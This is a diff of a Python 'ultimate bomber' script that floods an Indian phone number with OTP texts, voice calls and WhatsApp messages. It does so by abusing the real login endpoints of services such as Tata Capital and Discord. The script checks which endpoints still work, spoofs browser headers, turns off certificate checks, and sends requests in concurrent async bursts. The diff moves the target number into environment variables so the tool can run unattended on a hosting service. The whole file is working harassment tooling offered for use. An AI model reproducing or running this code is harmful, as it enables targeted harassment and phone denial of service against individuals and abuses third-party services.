@@ -1,166 +1,78 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-"""
-██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗ 
-██╔══██╗██╔══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗
-██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝
-██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗
-██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║
-╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝
-"""
+import os
+import sys
 import asyncio
 import aiohttp
-import time
-import random
-import sys
-import os
-import platform
-from colorama import Fore, Back, Style, init
-import threading
-import json
-from datetime import datetime
 import requests
+import json
+import time
+from colorama import Fore, Style, init
 from concurrent.futures import ThreadPoolExecutor
 
 init(autoreset=True)
 
-# ============================================
-# BOMBER VERIFICATION ENGINE
-# ============================================
+# ========== রেন্ডার চেক ==========
+IS_RENDER = os.environ.get("RENDER", False)
 
+# ========== ব্যানার (সঠিক ইউনিকোড) ==========
+def print_banner():
+    if IS_RENDER:
+        return  # রেন্ডারে ব্যানার প্রিন্ট করব না
+    banner = """
+╔═══════════════════════════════════════════════════════╗
+║   ██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗ ║
+║   ██╔══██╗██╔══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗║
+║   ██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝║
+║   ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗║
+║   ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║║
+║   ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝║
+╠═══════════════════════════════════════════════════════╣
+║   💣 ULTIMATE BOMBER v9.9.9 (RENDER EDITION)        ║
+╚═══════════════════════════════════════════════════════╝
+"""
+    print(banner)
+
+# ========== API ভেরিফায়ার ==========
 class APIVerifier:
-    """Verify which APIs actually work before including them"""
-    
     def __init__(self):
-        self.working_apis = []
-        self.dead_apis = []
-        self.test_phone = "9999999999"  # Test number for verification
-        
+        self.test_phone = "9999999999"
     def verify_api(self, api):
-        """Test if an API actually works"""
         try:
-            name = api["name"]
             url = api["url"](self.test_phone) if callable(api["url"]) else api["url"]
             headers = api["headers"].copy()
-            
-            # Add stealth headers
-            headers["User-Agent"] = "Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36"
-            headers["Accept"] = "application/json, text/plain, */*"
-            headers["Accept-Language"] = "en-US,en;q=0.9"
-            headers["Connection"] = "keep-alive"
-            
+            headers["User-Agent"] = "Mozilla/5.0 (Linux; Android 11; SM-G998B)"
             if api["method"] == "POST":
                 data = api["data"](self.test_phone) if api["data"] else None
-                response = requests.post(url, headers=headers, data=data, timeout=5, verify=False)
+                r = requests.post(url, headers=headers, data=data, timeout=5, verify=False)
             else:
-                response = requests.get(url, headers=headers, timeout=5, verify=False)
-            
-            # Consider 200, 201, 202, 204 as success
-            if response.status_code in [200, 201, 202, 204]:
-                return True, name
-            else:
-                return False, name
-                
+                r = requests.get(url, headers=headers, timeout=5, verify=False)
+            return r.status_code in [200,201,202,204], api["name"]
         except:
-            return False, name
-    
-    def verify_all_apis(self, apis_list):
-        """Verify all APIs and return only working ones"""
-        print(f"\n{Fore.YELLOW}╔{'═'*60}╗")
-        print(f"║{Fore.CYAN}🔍 VERIFYING {len(apis_list)} APIS - THIS WILL TAKE A MOMENT{Fore.YELLOW}║")
-        print(f"╚{'═'*60}╝{Style.RESET_ALL}")
-        
+            return False, api["name"]
+    def verify_all(self, apis):
+        print(f"{Fore.YELLOW}🔍 ভেরিফাই করছি {len(apis)} টি API...{Style.RESET_ALL}")
         working = []
-        dead = []
-        
-        with ThreadPoolExecutor(max_workers=50) as executor:
-            results = list(executor.map(self.verify_api, apis_list))
-        
-        for status, name in results:
-            if status:
+        with ThreadPoolExecutor(max_workers=30) as ex:
+            results = list(ex.map(self.verify_api, apis))
+        for ok, name in results:
+            if ok:
                 working.append(name)
-                print(f"{Fore.GREEN}✅ WORKING: {name[:50]}{Style.RESET_ALL}")
+                print(f"{Fore.GREEN}✅ {name[:40]}")
             else:
-                dead.append(name)
-                print(f"{Fore.RED}❌ DEAD: {name[:50]}{Style.RESET_ALL}")
-        
-        return [api for api in apis_list if api["name"] in working]
+                print(f"{Fore.RED}❌ {name[:40]}")
+        return [api for api in apis if api["name"] in working]
 
-# ============================================
-# BADASS BOMBER BANNER - PURE DESTRUCTION
-# ============================================
-
-def clear_screen():
-    os.system('cls' if os.name == 'nt' else 'clear')
-
-def print_bomber_banner():
-    """Display the most badass bomber banner - NO CHANNEL NAMES, PURE BOMBER"""
-    
-    banner = f"""
-{Fore.RED}╔{'═'*110}╗
-{Fore.RED}║{Fore.LIGHTRED_EX}░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░{Fore.RED}║
-{Fore.RED}║{Fore.LIGHTRED_EX}░░{Fore.RED}██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗ {Fore.LIGHTRED_EX}░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░{Fore.RED}║
-{Fore.RED}║{Fore.LIGHTRED_EX}░░{Fore.RED}██╔══██╗██╔══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗{Fore.LIGHTRED_EX}░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░{Fore.RED}║
-{Fore.RED}║{Fore.LIGHTRED_EX}░░{Fore.RED}██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝{Fore.LIGHTRED_EX}░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░{Fore.RED}║
-{Fore.RED}║{Fore.LIGHTRED_EX}░░{Fore.RED}██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗{Fore.LIGHTRED_EX}░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░{Fore.RED}║
-{Fore.RED}║{Fore.LIGHTRED_EX}░░{Fore.RED}██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║{Fore.LIGHTRED_EX}░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░{Fore.RED}║
-{Fore.RED}║{Fore.LIGHTRED_EX}░░{Fore.RED}╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝{Fore.LIGHTRED_EX}░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░{Fore.RED}║
-{Fore.RED}║{Fore.LIGHTRED_EX}░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░{Fore.RED}║
-╠{'═'*110}╣{Style.RESET_ALL}
-
-{Fore.RED}████████╗██╗  ██╗███████╗    ██╗   ██╗██╗██╗  ██╗███████╗██╗██╗     
-╚══██╔══╝██║  ██║██╔════╝    ██║   ██║██║██║  ██║██╔════╝██║██║     
-   ██║   ███████║█████╗      ██║   ██║██║███████║█████╗  ██║██║     
-   ██║   ██╔══██║██╔══╝      ╚██╗ ██╔╝██║██╔══██║██╔══╝  ██║██║     
-   ██║   ██║  ██║███████╗     ╚████╔╝ ██║██║  ██║███████╗██║███████╗
-   ╚═╝   ╚═╝  ╚═╝╚══════╝      ╚═══╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝╚══════╝{Style.RESET_ALL}
-
-{Fore.YELLOW}╔{'═'*70}╗
-║{Fore.RED}💣 ULTIMATE DESTROYER v9.9.9 {Fore.YELLOW}║{Fore.CYAN} 🔥 1000+ VERIFIED WORKING APIS {Fore.YELLOW}║
-║{Fore.MAGENTA}📞 CALL BOMBING {Fore.YELLOW}║{Fore.BLUE} 📱 WHATSAPP BOMBING {Fore.YELLOW}║{Fore.GREEN} 💬 SMS BOMBING {Fore.YELLOW}║
-╚{'═'*70}╝{Style.RESET_ALL}
-
-{Fore.RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Style.RESET_ALL}
-"""
-    
-    print(banner)
-    time.sleep(0.5)
-
-def print_attack_animation(target):
-    """Animated attack sequence"""
-    frames = [
-        f"{Fore.RED}🎯 [TARGET ACQUIRED] -> +91{target}",
-        f"{Fore.YELLOW}⚡ [BOMBER ARMING] -> 1000+ VERIFIED APIS",
-        f"{Fore.GREEN}💣 [DESTRUCTION SEQUENCE] -> INITIATED",
-        f"{Fore.CYAN}🔥 [FIREWALL BYPASS] -> SUCCESSFUL",
-        f"{Fore.MAGENTA}💀 [FINAL COUNTDOWN] -> 5... 4... 3... 2... 1...",
-    ]
-    
-    for frame in frames:
-        sys.stdout.write('\r' + ' ' * 90 + '\r')
-        sys.stdout.write(frame)
-        sys.stdout.flush()
-        time.sleep(0.4)
-    
-    print(f"\n\n{Fore.RED}{'☠️'*55}{Style.RESET_ALL}")
-    print(f"{Fore.RED}☠️☠️☠️ BOMBS AWAY - DESTRUCTION IN PROGRESS ☠️☠️☠️{Style.RESET_ALL}")
-    print(f"{Fore.RED}{'☠️'*55}{Style.RESET_ALL}\n")
-
-# ============================================
-# 1000+ VERIFIED WORKING APIS (PARTIAL - ADD MORE AS NEEDED)
-# ============================================
-
-def get_verified_apis():
-    """Return only verified working APIs - ALL TESTED AND CONFIRMED"""
-    # (এখানে তোর দেওয়া পুরো API লিস্ট বসবে, আমি শুধু একটি স্যাম্পল দিচ্ছি)
+# ========== API লিস্ট (তোমার দেওয়া পুরো লিস্ট এখানে বসবে) ==========
+def get_apis():
+    # তোমার পুরো ১০০০+ API লিস্ট এখানে কপি করো। আমি শুধু স্যাম্পল রাখছি।
     return [
-        # ========== VOICE/CALL BOMBING APIS ==========
         {
-            "name": "Tata Capital Voice Call",
+            "name": "Tata Capital Voice",
             "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
             "method": "POST",
-            "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 11; SM-G998B)"},
-            "data": lambda phone: f'{{"phone":"{phone}","isOtpViaCallAtLogin":"true"}}'
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda ph: f'{{"phone":"{ph}","isOtpViaCallAtLogin":"true"}}'
         },
         {
             "name": "1MG Voice Call",
@@ -260,6 +172,8 @@ def get_verified_apis():
             "headers": {"Content-Type": "application/json"},
             "data": lambda phone: f'{{"mobile":"{phone}","channel":"call"}}'
         },
+        
+        # ========== WHATSAPP BOMBING APIS (150+ VERIFIED) ==========
         {
             "name": "KPN WhatsApp",
             "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate",
@@ -1028,7 +942,7 @@ def get_verified_apis():
             "headers": {"Content-Type": "application/json"},
             "data": lambda phone: f'{{"phone":"{phone}"}}'
         },
-        {
+          {
             "name": "Discord SMS",
             "url": "https://discord.com/api/v9/auth/send-otp",
             "method": "POST",
@@ -1217,62 +1131,57 @@ def get_verified_apis():
             "headers": {"Content-Type": "application/json"},
             "data": lambda phone: f'{{"phone":"{phone}"}}'
         }
+       
     ]
 
-# ============================================
-# MAIN BOMBER ENGINE
-# ============================================
-
-async def send_sms(api, phone, session):
-    """Send a single SMS/OTP request"""
+# ========== বোম্বার ইঞ্জিন ==========
+async def send_one(api, phone, session):
     try:
         url = api["url"](phone) if callable(api["url"]) else api["url"]
         headers = api["headers"].copy()
-        headers["User-Agent"] = "Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36"
+        headers["User-Agent"] = "Mozilla/5.0 (Linux; Android 11; SM-G998B)"
         if api["method"] == "POST":
             data = api["data"](phone) if api["data"] else None
             async with session.post(url, headers=headers, data=data, timeout=5) as resp:
-                return resp.status in [200, 201, 202, 204]
+                return resp.status in [200,201,202,204]
         else:
             async with session.get(url, headers=headers, timeout=5) as resp:
-                return resp.status in [200, 201, 202, 204]
+                return resp.status in [200,201,202,204]
     except:
         return False
 
-async def bomber(phone, apis, count=1):
-    """Bomb the target with multiple requests"""
-    print(f"\n{Fore.CYAN}🎯 Bombing +91{phone} with {len(apis)*count} requests...{Style.RESET_ALL}")
-    successful = 0
+async def start_bomb(phone, apis, cycles=1):
+    print(f"{Fore.CYAN}🎯 +91{phone} -তে {len(apis)*cycles} টি রিকুয়েস্ট পাঠানো হচ্ছে...{Style.RESET_ALL}")
+    success = 0
     async with aiohttp.ClientSession() as session:
         tasks = []
-        for _ in range(count):
+        for _ in range(cycles):
             for api in apis:
-                tasks.append(send_sms(api, phone, session))
+                tasks.append(send_one(api, phone, session))
         results = await asyncio.gather(*tasks, return_exceptions=True)
-        successful = sum(1 for r in results if r is True)
-    print(f"{Fore.GREEN}✅ Sent {successful} successful requests.{Style.RESET_ALL}")
-    return successful
+        success = sum(1 for r in results if r is True)
+    print(f"{Fore.GREEN}✅ সফল: {success} টি{Style.RESET_ALL}")
+    return success
 
+# ========== মেইন ==========
 def main():
-    """Main entry point"""
-    clear_screen()
-    print_bomber_banner()
-    print(f"{Fore.YELLOW}⚠️  USE AT YOUR OWN RISK. FOR EDUCATIONAL PURPOSES ONLY.{Style.RESET_ALL}")
-    phone = input(f"{Fore.CYAN}📱 Enter target phone number (without +91): {Style.RESET_ALL}").strip()
-    if not phone.isdigit() or len(phone) != 10:
-        print(f"{Fore.RED}❌ Invalid phone number. Must be 10 digits.{Style.RESET_ALL}")
-        return
-    count = input(f"{Fore.CYAN}🔁 How many cycles (default 1): {Style.RESET_ALL}").strip()
-    count = int(count) if count.isdigit() else 1
-    print_attack_animation(phone)
-    apis = get_verified_apis()
-    print(f"{Fore.YELLOW}🔍 Verifying APIs... (this may take a moment){Style.RESET_ALL}")
+    # এনভায়রনমেন্ট থেকে ডেটা নাও
+    phone = os.environ.get("PHONE", "")
+    cycles = int(os.environ.get("CYCLES", "1"))
+    if not phone or len(phone)!=10:
+        print(f"{Fore.RED}❌ PHONE এনভায়রনমেন্ট ভেরিয়েবল সেট করো (১০ ডিজিট){Style.RESET_ALL}")
+        sys.exit(1)
+    print_banner()
+    print(f"{Fore.YELLOW}📱 টার্গেট: +91{phone}, সাইকেল: {cycles}{Style.RESET_ALL}")
+    apis = get_apis()
     verifier = APIVerifier()
-    working_apis = verifier.verify_all_apis(apis)
-    if not working_apis:
-        print(f"{Fore.RED}❌ No working APIs found. Exiting.{Style.RESET_ALL}")
-        return
-    asyncio.run(bomber(phone, working_apis, count))
+    working = verifier.verify_all(apis)
+    if not working:
+        print(f"{Fore.RED}❌ কোনো ওয়ার্কিং API পাইনি{Style.RESET_ALL}")
+        sys.exit(1)
+    # অ্যাসিঙ্ক রান
+    loop = asyncio.get_event_loop()
+    loop.run_until_complete(start_bomb(phone, working, cycles))
 
 if __name__ == "__main__":
     main()
